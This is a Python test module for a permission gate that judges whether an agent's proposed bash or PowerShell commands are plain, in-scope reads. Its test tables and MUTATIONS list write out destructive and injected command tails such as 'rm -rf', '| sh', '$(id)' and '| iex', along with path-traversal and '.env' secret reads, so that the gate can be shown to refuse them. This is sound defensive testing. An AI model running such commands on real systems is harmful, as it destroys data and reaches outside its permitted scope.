for command in ("cat @MAIN@/.git/config", "cat @MAIN@/.git/worktrees/Seat-T1/HEAD",
                "ls @MAIN@/.git/worktrees", "cat @OTHER@/f.txt"):
    bash("inv5-stores", command, pr.OUTSIDE, "the shared repository and another seat's tree")
ps("inv5-stores", "Get-Content @MAIN@/.git/config", pr.OUTSIDE, "the shared repository")


# ── the trees ────────────────────────────────────────────────────────────────


def _fwd(path) -> str:
    return str(path).replace("\\", "/")


@pytest.fixture(scope="module")
def tree(tmp_path_factory):
    """A main checkout, this seat's linked worktree with every kind of file the table
    names, another seat's worktree, a plain directory, and a card scratch folder."""
    top = tmp_path_factory.mktemp("plainread")
    main = top / "main"
    (main / ".git" / "worktrees" / "Seat-T1").mkdir(parents=True)
    (main / ".git" / "config").write_text("[core]\n", encoding="utf-8")
    (main / ".git" / "worktrees" / "Seat-T1" / "HEAD").write_text("ref: x\n", encoding="utf-8")
    (main / "outside.txt").write_text("outside", encoding="utf-8")
    (main / "a.txt").write_text("the checkout's", encoding="utf-8")
    (main / "precious").mkdir()
    (main / "precious" / "x").write_text("keep", encoding="utf-8")

    def linked(parent: Path, name: str) -> Path:
        wt = parent / name
        wt.mkdir(parents=True)
        (wt / ".git").write_text(f"gitdir: {main}/.git/worktrees/{name}\n", encoding="utf-8")
        return wt

    wt = linked(main / ".worktrees", "Seat-T1")
    other = linked(main / ".worktrees", "Other-T2")
    (other / "f.txt").write_text("theirs", encoding="utf-8")
    wt3 = linked(main / ".worktrees", "Seat-T3")        # the same seat's second worktree
    (wt3 / "c.txt").write_text("also own", encoding="utf-8")
    plain = top / "plain"
    plain.mkdir()
    (plain / "a.txt").write_text("plain", encoding="utf-8")
    scratch = top / "scratch"
    card = linked(scratch / "T9999", "Seat-X")
    (card / "a.txt").write_text("own", encoding="utf-8")
    (card / ".litetui-data.json").write_text("{}", encoding="utf-8")   # makes it a data root
    (card / "jobs.json").write_text("[]", encoding="utf-8")
    (scratch / "T9999" / "card-note.txt").write_text("card", encoding="utf-8")
    temp = top / "temp"
    temp.mkdir()
    (temp / "t.txt").write_text("temp", encoding="utf-8")

    files = ["a.txt", "b.txt", "notes.md", "data.json", ".gitignore", ".github/w.yml", "src/x.py",
             "outside.txt",                     # a decoy: the same NAME as the file outside
             "src/y.py", "src/a.txt", "my docs/f.txt", "sub/deep/z.txt",
             *SECRET_FILES, *PROTECTED_FILES]
    for name in files:
        target = wt / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("foo\n", encoding="utf-8")

    have = {"symlink": True, "junction": False, "hardlink": True, "windows": os.name == "nt"}
    rooted = _fwd(wt)[2:] if re.match(r"[A-Za-z]:", str(wt)) else _fwd(wt)   # the drive cut off
    try:
        (wt / "link_dir").symlink_to(main / "precious", target_is_directory=True)
        (wt / "link_file").symlink_to(main / "precious" / "x")
        (wt / "link_env").symlink_to(wt / ".env")
        (wt / "inner_link").symlink_to(wt / "src", target_is_directory=True)
        (wt / "api_token_link").symlink_to(wt / "a.txt")
    except (OSError, NotImplementedError):
        have["symlink"] = False
    try:
        os.link(main / "outside.txt", wt / "hard.txt")
    except (OSError, NotImplementedError):
        have["hardlink"] = False
    if sys.platform == "win32":
        try:
            import _winapi
            _winapi.CreateJunction(str(main / "precious"), str(wt / "junction"))
            have["junction"] = True
        except OSError:
            pass
    # review round 2, S1: plain files made to LOOK like the runtime's link forms. Nothing
    # here is a working link and nothing opens them: the SYSTEM attribute is set by one
    # Windows call, the `.lnk` names are ordinary text files.
    for name in ("sysfile.txt", "sysdir/inner.txt", "short.lnk", "lnkdir.lnk/x.txt", "gone.lnk"):
        (wt / name).parent.mkdir(parents=True, exist_ok=True)
        (wt / name).write_text("foo\n", encoding="utf-8")
    have["sysattr"] = False
    if sys.platform == "win32":
        import ctypes
        set_attributes = ctypes.windll.kernel32.SetFileAttributesW
        have["sysattr"] = bool(set_attributes(str(wt / "sysfile.txt"), 0x4)
                               and set_attributes(str(wt / "sysdir"), 0x4))
    return {"wt": wt, "main": main, "other": other, "plain": plain, "missing": top / "nowhere",
            "card": card, "src": wt / "src", "have": have, "none": None,
            "fill": {"@WT@": _fwd(wt), "@WTB@": str(wt), "@MAIN@": _fwd(main),
                     "@WT3@": _fwd(wt3), "@WTROOTED@": rooted,
                     "@WTROOTEDB@": rooted.replace("/", "\\"),
                     "@OTHER@": _fwd(other), "@OTHERB@": str(other),
                     "@CARD@": _fwd(scratch / "T9999"), "@TEMP@": _fwd(temp)},
            "scratch": scratch, "temp": temp}


def _fill(value, tree):
    if isinstance(value, str):
        for mark, text in tree["fill"].items():
            value = value.replace(mark, text)
    elif isinstance(value, dict):
        return {k: _fill(v, tree) for k, v in value.items()}
    return value


def _assess(row: Row, tree, command=None) -> pr.PlainRead:
    args = row.args if row.args is not None else {
        "command": row.command if command is None else command, **row.extra}
    workspace = tree[row.where]
    return pr.assess(row.tool or (row.shell or ""), _fill(args, tree), row.shell, workspace,
                     row.seat, cwd=tree[row.cwd] if row.cwd else workspace)


# ── the table, row by row ────────────────────────────────────────────────────


@pytest.mark.parametrize("case", CASES, ids=[r.id for r in CASES])
def test_case(case: Row, tree):
    if case.needs == "windows" and not tree["have"]["windows"]:
        pytest.skip("the row's expectation is Windows path semantics; not judged on this platform")
    if case.needs and not tree["have"][case.needs]:
        pytest.skip(f"this platform refused to create a {case.needs}; the row is not judged here")
    if os.name != "nt" and isinstance(case.command, str) and (
            (case.shell == PS and "\\" in case.command) or _DRIVE_PATH.search(case.command)):
        pytest.skip("the row's expectation is Windows path semantics (a drive letter or `\\`)")
    got = _assess(case, tree)
    assert case.reason in pr.REASONS | {OK}
    assert (got.eligible, got.reason) == (case.reason == OK, case.reason), (
        case.attack, _fill(case.command, tree), got)
    if got.eligible:
        assert got.verbs and got.operands is not None
        assert got.command == _fill(case.command, tree), "a judge is shown the whole command"
        if case.shows is not None:
            assert got.operands == case.shows
        if case.verbs is not None:
            assert got.verbs == case.verbs
    else:
        assert got.verbs == () and got.operands == (), "a refusal carries no facts"


def test_the_table_is_counted_and_complete():
    """The counts a report quotes, and the properties that make them mean something."""
    assert len({r.id for r in CASES}) == len(CASES)
    by_reason = Counter(r.reason or "ELIGIBLE" for r in CASES)
    assert set(by_reason) == pr.REASONS | {"ELIGIBLE"}, (
        "every reason in the closed set has a row", pr.REASONS - set(by_reason))
    for group in ("redirect", "pipe-write", "launcher", "substitution", "network", "environment",
                  "secrets", "too-long", "flags", "git", "outside", "path-form", "links",
                  "quoted-data", "inv3-scratch", "inv4-no-proof-by-absence", "inv5-stores",
                  "dotdot", "rooted", "device", "rewritten-name", "native-args", "two-roots",
                  "posix-forms", "fault", "r1-rg-config", "s1-runtime-links"):
        shells = {r.shell for r in CASES if r.group == group}
        assert shells == {BASH, PS}, (group, shells)
    by_group = Counter(r.group for r in CASES)
    print(f"\nCASES rows={len(CASES)} eligible={by_reason['ELIGIBLE']} "
          f"not_eligible={len(CASES) - by_reason['ELIGIBLE']}")
    print("by reason: " + ", ".join(f"{k}={v}" for k, v in sorted(by_reason.items())))
    print("by group: " + ", ".join(f"{k}={v}" for k, v in sorted(by_group.items())))
    print("by shell: " + ", ".join(f"{k}={v}" for k, v in sorted(
        Counter(str(r.shell) for r in CASES).items())))
    print(f"ORDER rows={len(ORDER)}")


def _lead(command: str) -> str:
    return command.split()[0]


def test_every_verb_on_the_list_has_an_eligible_row_and_git_is_all_there():
    for shell, verbs in pr.VERBS.items():
        leads = {_lead(r.command).lower() if shell == PS else _lead(r.command)
                 for r in CASES if r.shell == shell and r.reason == OK and isinstance(r.command, str)}
        stages = {stage.split()[0].lower() for r in CASES
                  if r.shell == shell and r.reason == OK and isinstance(r.command, str)
                  for stage in r.command.split("|") if stage.strip()}
        for verb, spec in verbs.items():
            assert verb in (stages if spec.kind == pr.FILTER else leads), (shell, verb)
    for shell in (BASH, PS):
        seen = {r.command.split()[1] for r in CASES
                if r.group == "git" and r.shell == shell and r.command.startswith("git ")
                and not r.command.split()[1].startswith("-")}
        assert {sub.split()[0] for sub in GIT_SUBCOMMANDS} <= seen, shell
    assert all(r.reason != OK for r in CASES if r.group in ("git", "real-eight"))
    assert sum(r.group == "real-eight" for r in CASES) == 9


def test_s1_a_reparse_point_that_resolution_left_in_place_is_refused(tree, monkeypatch):
    """The third of S1's forms, a link kind Windows will not follow (the Linux-subsystem
    kind): Python's real-path resolution leaves it in place and reports an ordinary name.
    This machine offers no way to MAKE one without running a tool, so the attribute is
    reported by a stand-in for `os.lstat` here: the row tests the wall's reading of the
    attribute, not Windows' writing of it."""
    if os.name != "nt":
        pytest.skip("the attribute exists on Windows only")
    target = os.path.normcase(os.path.realpath(tree["wt"] / "b.txt"))
    real_lstat = os.lstat

    class Marked:                       # the real answer, with the reparse bit added
        def __init__(self, info):
            self._info = info

        def __getattr__(self, name):
            return getattr(self._info, name)

        st_file_attributes = property(lambda self: self._info.st_file_attributes | 0x400)

    def lstat(path, *args, **kwargs):
        info = real_lstat(path, *args, **kwargs)
        return Marked(info) if os.path.normcase(str(path)) == target else info

    def ask(command):
        return pr.assess("bash", {"command": command}, BASH, tree["wt"], SEAT, cwd=tree["wt"])

    assert ask("cat b.txt").eligible and ask("ls b.txt").eligible      # control, real lstat
    monkeypatch.setattr(os, "lstat", lstat)
    for command in ("cat b.txt", "ls b.txt", "cat a.txt b.txt"):
        got = ask(command)
        assert (got.eligible, got.reason) == (False, pr.NOT_PLAIN_FILE), command
    assert ask("cat a.txt").eligible                                    # only the marked file

    def refusing(path, *args, **kwargs):                                # a name that cannot be examined
        if os.path.normcase(str(path)) == target:
            raise PermissionError(13, "denied", str(path))
        return real_lstat(path, *args, **kwargs)

    monkeypatch.setattr(os, "lstat", refusing)
    got = ask("ls b.txt")
    assert (got.eligible, got.reason) == (False, pr.NOT_PLAIN_FILE)


def test_r1_every_eligible_rg_stage_has_its_config_switched_off_in_the_text(tree):
    """Policy owner's R1, as a property of the WHOLE table and not of chosen rows: wherever
    the wall says eligible and a stage is rg, that stage's own words hold `--no-config`
    before its pattern, and rg is nowhere a PowerShell verb. The child process inherits
    RIPGREP_CONFIG_PATH, so nothing less proves which options rg really runs with."""
    assert "rg" not in pr.VERBS[PS]
    seen = 0
    for case in CASES:
        if not isinstance(case.command, str) or case.args is not None:
            continue
        if case.needs and not tree["have"][case.needs]:
            continue
        got = _assess(case, tree)
        if not got.eligible or "rg" not in got.verbs:
            continue
        assert case.shell == BASH, case.command
        for tokens, _separator in ws._tokenize(case.command.replace("2>&1", " ")):
            words = [word for word, _quoted in tokens]
            if words and words[0] == "rg":
                options = words[1:words.index("--")] if "--" in words else words[1:]
                assert "--no-config" in options, case.command
                seen += 1
    assert seen >= 5


MUTATIONS = {
    BASH: ("; rm -rf x", " && rm x", " || rm x", " | sh", " | tee out.txt", " > out.txt",
           " >> out.txt", " 2> err.txt", " $(id)", " `id`", " &", " | xargs rm", "\nrm x",
           " < a.txt", " | git status", " ../../outside.txt"),
    PS: ("; Remove-Item x", " | Out-File o.txt", " | Set-Content o.txt", " > o.txt", " | iex",
         " $(1)", " | % { }", " | ForEach-Object { Remove-Item x }", " &", "\nRemove-Item x",
         " | Get-Content", " | git status", "; Get-Content ..\\..\\outside.txt"),
}


def test_no_eligible_row_survives_a_dangerous_tail(tree):
    """Every eligible command, with each tail appended, must stop being eligible: the wall
    judges the WHOLE command, so no plain read can carry something else through."""
    tried = 0
    for case in CASES:
        if case.reason != OK or not isinstance(case.command, str) or case.args is not None:
            continue
        if case.needs and not tree["have"][case.needs]:
            continue
        for tail in MUTATIONS[case.shell]:
            got = _assess(case, tree, command=case.command.rstrip(" ;") + tail)
            assert not got.eligible, (case.command, tail, got)
            tried += 1
    assert tried > 1500


# ── the order the ONE insertion keeps (invariants 1, 2 and 6) ────────────────
#
# T0408-L, stage 1. Until that sub-task this table was judged against a four-line model
# of the insertion called `inserted`, and both reviews of 39c010a said, rightly, that it
# was a specification and not evidence. The model is gone. Every row now goes through the
# REAL door, `LiteTUI._authorize_action`, twice: the counting setting off, then on.
#
# What a row measures now:
#   * `owned` and `policy`: what the door does today, read off its own behaviour (a
#     refusal with nobody asked is a DENY, a request to the spawner is a CONFIRM, an
#     authorization with nobody asked is an ALLOW);
#   * `eligible`: the wall's answer when asked directly;
#   * the count: with the setting on, a row is logged as "counted" on EXACTLY the rows
#     whose `final` column says a judge could spare the question (policy CONFIRM, final
#     ALLOW). On every other row the wall is either not consulted at all or says no;
#   * and on every row, off and on, the door asks, refuses and stops identically.
#
# Stage 1 authorizes nothing, so `final` is still a statement about a LATER stage. What
# is evidence today is that the count lands on those rows and on no others.


@dataclass(frozen=True)
class Order:
    id: str
    profile: str
    command: str
    policy: str                     # what the door's policy decision is today
    eligible: bool                  # what the wall says
    final: str                      # with a judge that ALWAYS answered allow (a later stage)
    attack: str
    rule: str = ""                  # "deny" | "allow": a standing rule for this call
    where: str = "wt"
    shell: str = BASH
    owned: bool = False             # the jobs-file ownership refusal fires for this call


READ = "cat a.txt 2>&1"             # CONFIRM on interactive bash today (an unrepresented shape)
PS_READ = "Get-Content a.txt || Get-ChildItem"   # the same, in PowerShell
ORDER = [
    Order("inv1:004", tp.INTERACTIVE, "echo [] > jobs.json", tp.ALLOW, False, tp.DENY,
          "the jobs-file ownership refusal comes before the policy and before the wall",
          where="card", owned=True),
    Order("inv1:005", tp.INTERACTIVE, "echo [] > jobs.json", tp.CONFIRM, False, tp.DENY,
          "the same refusal for the PowerShell tool", where="card", owned=True, shell=PS),
    Order("inv1:006", tp.INTERACTIVE, "cat jobs.json", tp.ALLOW, True, tp.ALLOW,
          "READING the schedule file is not an ownership refusal, and never asks",
          where="card"),
    Order("inv1:007", tp.INTERACTIVE, "Remove-Item -Recurse -Force @MAIN@", tp.DENY, False, tp.DENY,
          "the deny floor, PowerShell", where="main", shell=PS),
    Order("inv1:008", tp.INTERACTIVE, PS_READ, tp.DENY, True, tp.DENY,
          "a standing human DENY on an eligible PowerShell call stays a DENY", rule="deny",
          shell=PS),
    Order("inv2:010", "typo", PS_READ, tp.DENY, True, tp.DENY,
          "an unknown profile, PowerShell", shell=PS),
    Order("inv2:011", tp.INTERACTIVE, "Get-Content a.txt", tp.ALLOW, True, tp.ALLOW,
          "an ordinary PowerShell read never asks today: the wall is not consulted", shell=PS),
    Order("inv2:012", tp.INTERACTIVE, "Get-Content a.txt 2>&1", tp.ALLOW, True, tp.ALLOW,
          "PowerShell's 2>&1 is already represented, so it is not asked either", shell=PS),
    Order("inv2:013", tp.INTERACTIVE, PS_READ, tp.CONFIRM, True, tp.ALLOW,
          "THE ONE CLASS in PowerShell: asked today, eligible", shell=PS),
    Order("inv2:014", tp.INTERACTIVE, "Get-Content .env || Get-ChildItem", tp.CONFIRM, False,
          tp.CONFIRM, "asked today, a secret: an always-allow judge changes nothing", shell=PS),
    Order("inv6:004", tp.STRICT, "Get-Content a.txt", tp.CONFIRM, True, tp.CONFIRM,
          "strict, PowerShell: an eligible read is STILL asked", shell=PS),
    Order("inv6:005", tp.STRICT, PS_READ, tp.CONFIRM, True, tp.CONFIRM,
          "strict, the one class in PowerShell: still asked", shell=PS),
    Order("inv1:001", tp.INTERACTIVE, "rm -rf @MAIN@", tp.DENY, False, tp.DENY,
          "the deny floor refuses before anything else", where="main"),
    Order("inv1:002", tp.INTERACTIVE, READ, tp.DENY, True, tp.DENY,
          "a standing human DENY on a call the wall finds eligible stays a DENY", rule="deny"),
    Order("inv1:003", tp.STRICT, READ, tp.DENY, True, tp.DENY,
          "the same, on strict", rule="deny"),
    Order("inv2:001", "typo", READ, tp.DENY, True, tp.DENY,
          "an unknown profile is rejected though the wall finds the call eligible"),
    Order("inv2:002", "narrow", READ, tp.DENY, True, tp.DENY,
          "a capability the profile does not grant, though the wall finds the call eligible"),
    Order("inv2:003", tp.INTERACTIVE, READ, tp.ALLOW, True, tp.ALLOW,
          "a standing human ALLOW already answered: the wall is not consulted", rule="allow"),
    Order("inv2:004", tp.INTERACTIVE, "cat a.txt", tp.ALLOW, True, tp.ALLOW,
          "an ordinary read never asks today: unchanged, the wall is not consulted"),
    Order("inv2:005", tp.AUTONOMOUS, "rm -rf dist", tp.ALLOW, False, tp.ALLOW,
          "autonomous never asks: unchanged"),
    Order("inv2:006", tp.INTERACTIVE, READ, tp.CONFIRM, True, tp.ALLOW,
          "THE ONE CLASS: asked today, eligible, so a judge may spare the question"),
    Order("inv2:007", tp.INTERACTIVE, "cat a.txt 2>&1; rm -rf dist", tp.CONFIRM, False, tp.CONFIRM,
          "asked today and NOT eligible: an always-allow judge changes nothing"),
    Order("inv2:008", tp.INTERACTIVE, "cat .env 2>&1", tp.CONFIRM, False, tp.CONFIRM,
          "asked today, a secret: an always-allow judge changes nothing"),
    Order("inv2:009", tp.INTERACTIVE, "git status 2>&1", tp.CONFIRM, False, tp.CONFIRM,
          "asked today, git: an always-allow judge changes nothing"),
    Order("inv6:001", tp.STRICT, "cat a.txt", tp.CONFIRM, True, tp.CONFIRM,
          "strict asks about every command; an eligible read is STILL asked"),
    Order("inv6:002", tp.STRICT, READ, tp.CONFIRM, True, tp.CONFIRM,
          "strict, the one class: still asked"),
    Order("inv6:003", tp.STRICT, "ls -la", tp.CONFIRM, True, tp.CONFIRM,
          "strict, a listing: still asked"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("case", ORDER, ids=[o.id for o in ORDER])
async def test_order(case: Order, tree, tmp_path, monkeypatch):
    monkeypatch.setitem(tp.PROFILES, "narrow", tp.ToolProfile(
        "narrow", allow=frozenset({tp.READ_ONLY}), confirm=frozenset()))
    monkeypatch.chdir(tree[case.where])
    args = {"command": _fill(case.command, tree)}
    workspace = tree[case.where]
    tool = case.shell
    seat = "Seat-X" if case.where == "card" else SEAT
    wall = pr.assess(tool, args, case.shell, workspace, seat)
    assert wall.eligible == case.eligible, (case.attack, wall)
    # a seat that a launcher spawned: never the owner, so the ownership rule applies to it
    with door.seat_app(tmp_path, workspace, profile=case.profile) as app:
        if app.plugins.policy_for(tool) is None:
            pytest.skip(f"no {tool} tool is registered on this machine")
        app.seat.name = seat
        if case.rule:
            # the door judges a host tool against the install folder (app.py, `workspace or
            # paths.ROOT`), so the standing rule is keyed the way the door will key it
            probe = tp.evaluate(tp.INTERACTIVE, tp.SHELL_POLICY, args, paths.ROOT, tool_name=tool,
                                shell=case.shell, seat_name=seat)
            key = [tp.rule_key(tool, probe.capabilities)]
            app.settings.tool_deny = key if case.rule == "deny" else []
            app.settings.tool_always_allow = key if case.rule == "allow" else []
        wire = door.Wire(monkeypatch)
        off, on = await door.both(app, wire, tool, args)
    # invariant 1 and 2: with the setting on, the door does what it does with it off
    assert door.same_but_for_rows(off, on), (case.attack, off, on)
    assert (off["observed"], off["assessed"]) == ([], 0)
    today = (tp.CONFIRM if off["asked"] else tp.ALLOW if off["authorized"] else tp.DENY)
    assert today == (tp.DENY if case.owned else case.policy), (case.attack, off)
    assert ("T1085" in (off["refusal"] or "")) == case.owned, (case.attack, off["refusal"])
    counted = [row for row in on["observed"] if row["status"] == pj.COUNTED]
    assert bool(counted) == (case.policy == tp.CONFIRM and case.final == tp.ALLOW), (
        case.attack, on["observed"])
    if today != tp.CONFIRM:
        # a DENY is a DENY and an ALLOW an ALLOW: the insertion is never reached, so the
        # wall is not consulted and nothing is logged, whatever the wall would have said
        assert (on["observed"], on["assessed"]) == ([], 0), case.attack
    elif case.profile != tp.INTERACTIVE:
        # invariant 6: strict is excluded before the wall is asked
        assert [(row["status"], row["exit_code"]) for row in on["observed"]] == [(pj.EXCLUDED, 2)]
        assert on["assessed"] == 0, case.attack
    else:
        assert [row["status"] for row in on["observed"]] == [
            pj.COUNTED if case.eligible else pj.NOT_ELIGIBLE], (case.attack, on["observed"])
        assert on["assessed"] == 1


def test_inv3_the_scratch_roots_are_output_authority_and_not_read_authority(tree, monkeypatch):
    """The distinguishing half of the inv3 rows: `output_context` DOES hold the card
    folder and TEMP for this seat, and the wall still calls a read there outside."""
    monkeypatch.setenv("LITETUI_OUTPUT_SCRATCH_ROOTS", str(tree["scratch"]))
    monkeypatch.setenv("TEMP", str(tree["temp"]))
    monkeypatch.setenv("TMP", str(tree["temp"]))
    roots = {os.path.normcase(str(r)) for r in ws.output_context(tree["card"], SEAT)[0]}
    assert os.path.normcase(str((tree["scratch"] / "T9999").resolve())) in roots
    assert os.path.normcase(str(tree["temp"].resolve())) in roots
    for command in ("cat @CARD@/card-note.txt", "cat @TEMP@/t.txt"):
        got = pr.assess("bash", {"command": _fill(command, tree)}, BASH, tree["card"], SEAT,
                        cwd=tree["card"])
        assert (got.eligible, got.reason) == (False, pr.OUTSIDE)


def test_inv4_those_rows_really_carry_no_danger_label_today(tree, monkeypatch):
    """The distinguishing half of the inv4 rows: today's classifier names NO danger class
    for these, and the wall refuses them all the same. (The two `||` rows are left out of
    this half on purpose: what label they carry is the policy owner's to change.)"""
    monkeypatch.chdir(tree["wt"])
    for command in INV4_NO_LABEL:
        if "||" not in command:
            assert tp.danger(command, tree["wt"], shell=BASH) is None, command


def test_inv6_the_wall_takes_no_profile():
    """A human's choice of strict cannot widen or narrow what is eligible: the function
    has no way to be told the profile."""
    import inspect
    assert list(inspect.signature(pr.assess).parameters) == [
        "tool_name", "args", "shell", "workspace", "seat_name", "cwd"]


def test_the_modules_under_test_are_imported_from_this_checkout():
    """Import locality ONLY: the two modules are this checkout's files, not an installed
    copy. It does not prove invariant 7 (which base the checkout descends from): that is
    read from git and goes in the merge receipt (policy owner's review of 39c010a)."""
    here = Path(__file__).resolve().parents[1] / "src" / "litetui"
    assert Path(pr.__file__).resolve().parent == here, pr.__file__
    assert Path(ws.__file__).resolve().parent == here, ws.__file__


# ── what this module leans on, and what it must never do ─────────────────────


def test_the_reused_reader_still_behaves_as_this_module_assumes():
    """plain_read imports worktree_scope's private tokenizer and scope check. If either
    changes, this fails first and says which assumption broke."""
    assert ws._tokenize("cat a 'b c' | wc; ls") == [
        ([("cat", False), ("a", False), ("b c", True)], "|"),
        ([("wc", False)], ";"), ([("ls", False)], "")]
    # the reason `_guard` exists: the tokenizer drops a redirect without a word
    assert ws._tokenize("cat a > b")[0][0] == [("cat", False), ("a", False), ("b", False)]
    assert [sep for _, sep in ws._tokenize("a && b || c & d\ne")] == ["&&", "||", "&", "\n", ""]
    for text in ("cat $x", "cat `x`", "cat (x)", "cat %x%", "cat <x", 'cat "$x"', "cat 'x"):
        with pytest.raises(ws._Refuse):
            ws._tokenize(text)
    assert issubclass(ws._Refuse, Exception)


def test_the_scope_check_resolves_before_it_answers(tree):
    scope = ws._Scope(tree["wt"], tree["wt"], deleting=False)
    assert scope.check_value("src/x.py") is None
    for outside in ("../Other-T2/f.txt", _fwd(tree["main"] / "outside.txt"), "~/x", "//srv/x"):
        with pytest.raises(ws._Refuse):
            scope.check_value(outside)
    assert ws.own_roots(tree["wt"], SEAT) == [Path(os.path.realpath(tree["wt"]))]
    assert ws.own_roots(tree["main"], SEAT) == [
        Path(os.path.realpath(tree["wt"])), Path(os.path.realpath(tree["wt"].parent / "Seat-T3"))]
    assert ws.own_roots(tree["plain"], SEAT) == []


def test_the_module_only_reads_and_one_module_calls_it():
    source = Path(pr.__file__).read_text(encoding="utf-8")
    imported = set()
    called = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import):
            imported |= {alias.name for alias in node.names}
        elif isinstance(node, ast.ImportFrom):
            imported |= {f"{node.module}.{alias.name}" for alias in node.names}
        elif isinstance(node, ast.Call):
            func = node.func
            called.add(func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", ""))
    assert imported == {"__future__.annotations", "fnmatch", "os", "re",
                        "collections.abc.Mapping", "dataclasses.dataclass", "dataclasses.field",
                        "pathlib.Path", "litetui.worktree_scope"}
    assert not called & {"open", "read_text", "read_bytes", "write_text", "write_bytes", "system",
                         "popen", "Popen", "run", "startfile", "unlink", "rmdir", "rmtree", "mkdir",
                         "makedirs", "rename", "urlopen", "connect", "exec", "eval"}
    # T0408-L: ONE module names it now, the count-only insertion's own. Nothing else in
    # the package does, and that module calls `assess` in one place
    # (tests/test_permission_judge.py::test_the_check_is_called_from_the_judge_only).
    package = Path(pr.__file__).parent
    users = [p.name for p in package.rglob("*.py")
             if p.name != "plain_read.py" and "plain_read" in p.read_text(encoding="utf-8")]
    assert users == ["permission_judge.py"]


def test_the_reasons_are_a_closed_set_and_the_lists_are_the_stated_ones():
    assert len(pr.REASONS) == 24 and FAULT in pr.REASONS
    assert sorted(pr.VERBS[BASH]) == [
        "cat", "cmp", "diff", "egrep", "fgrep", "file", "grep", "head", "ls", "rg", "sha256sum",
        "stat", "tail", "wc"]
    assert sorted(pr.VERBS[PS]) == [
        "convertfrom-json", "convertto-json", "gc", "gci", "get-childitem", "get-content",
        "get-filehash", "get-item", "gi", "measure", "measure-object", "select",
        "select-object", "select-string", "sls", "sort-object", "test-path"]
    # review W1: no native program is a PowerShell verb; every one there is a cmdlet
    assert all(spec.cmdlet for spec in pr.VERBS[PS].values())
    # none of the in-tree list's writers, runners or launchers came across
    writers = {"rm", "del", "mv", "cp", "tee", "sed", "awk", "find", "xargs", "env", "set",
               "python", "node", "bash", "sh", "cmd", "pwsh", "powershell", "start", "echo",
               "set-content", "add-content", "out-file", "new-item", "git", "source", "."}
    assert not writers & (set(pr.VERBS[BASH]) | set(pr.VERBS[PS]))
    assert pr.SHARED_STORE_VERBS == {"git"}
    assert pr.MAX_COMMAND_CHARS == 2000
